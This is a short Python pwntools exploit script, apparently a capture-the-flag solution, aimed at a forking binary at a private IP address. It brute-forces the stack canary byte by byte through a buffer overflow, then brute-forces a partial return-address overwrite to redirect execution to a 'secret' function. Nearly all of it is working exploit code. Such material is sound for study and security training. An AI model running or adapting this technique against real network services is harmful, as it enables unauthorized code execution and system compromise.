from pwn import *
import time

binary_name = "./pwn"

context.terminal = ['tmux','splitw','-h']

#p = process(binary_name)
p = remote("192.168.125.11", "4337")

elf = ELF(binary_name)

secret_offset = elf.symbols["secret"]

win_string = b"You found the secret!"

# p = gdb.debug('./pwn1', """
#     break main
#     break vuln
#     c
#     c
# """)
# time.sleep(5)


print(p.clean().decode())

canary = b"\x00"

log.info('bruteforcing canary..')
for i in range(7):
    for j in range(256):
        print(j)
        p.writeline(b"y")
        buf = b"A"*32 + b"B"*8 + canary + (b"%c" % j)
        p.write(buf)
        resp = p.readuntil(b"Should I make you another fork?")
        if b"feeew" not in resp:
            print("found")
            canary += b"%c" % j
            break
    print(hexdump(canary))

log.info('bruteforcing secret()..')
for i in range(16):
    p.writeline(b"y")
    buf = b"A"*32 + b"B"*8 + canary + b"C"*8 + p16((secret_offset & 0x0fff) + 0x1000*i)
    p.write(buf)
    resp = p.readuntil(b"Should I make you another fork?")
    if win_string in resp:
        print(resp)
        break

p.interactive()
